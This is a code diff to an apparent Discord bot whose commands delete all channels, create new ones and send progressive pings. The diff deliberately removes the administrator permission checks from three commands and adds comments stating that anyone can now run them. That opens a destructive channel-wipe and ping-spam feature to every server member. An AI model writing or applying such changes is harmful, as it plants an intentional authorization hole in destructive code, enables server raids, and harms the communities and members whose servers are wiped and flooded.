@@ -35,11 +35,8 @@ async def on_ready():
 async def start_text(ctx, channel_name: str, *, ping_message: str):
     """Text command: !start channel_name ping_message"""
     
-    # Check if user has administrator permissions
-    if not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ You need administrator permissions!")
-        return
-
+    # REMOVED: Admin permission check - anyone can now run this command!
+    
     await ctx.send("🔄 Starting process... Please wait.")
     
     try:
@@ -147,11 +144,8 @@ async def start_text(ctx, channel_name: str, *, ping_message: str):
 async def configure(interaction: discord.Interaction, channel_name: str, ping_message: str):
     """Configure the channel name and ping message"""
     
-    # Check if user has administrator permissions
-    if not interaction.user.guild_permissions.administrator:
-        await interaction.response.send_message("❌ You need administrator permissions!", ephemeral=True)
-        return
-
+    # REMOVED: Admin permission check - anyone can now run this command!
+    
     # Update configuration
     bot_config["channel_name"] = channel_name
     bot_config["ping_message"] = ping_message
@@ -169,11 +163,8 @@ async def configure(interaction: discord.Interaction, channel_name: str, ping_me
 async def start_slash(interaction: discord.Interaction):
     """Delete all channels, create new ones, and send progressive pings"""
     
-    # Check if user has administrator permissions
-    if not interaction.user.guild_permissions.administrator:
-        await interaction.response.send_message("❌ You need administrator permissions!", ephemeral=True)
-        return
-
+    # REMOVED: Admin permission check - anyone can now run this command!
+    
     await interaction.response.defer(ephemeral=True)
     
     try:
